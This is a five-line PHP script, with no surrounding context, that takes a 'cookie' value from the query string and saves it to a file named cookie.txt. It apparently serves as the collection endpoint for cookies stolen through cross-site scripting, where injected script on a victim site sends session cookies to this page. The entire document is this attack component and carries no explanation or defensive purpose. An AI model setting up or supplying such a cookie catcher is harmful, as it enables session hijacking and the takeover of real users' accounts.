<?php
if (isset($_GET["cookie"])) {
    file_put_contents(".\cookie.txt", $_GET["cookie"]);
}
?>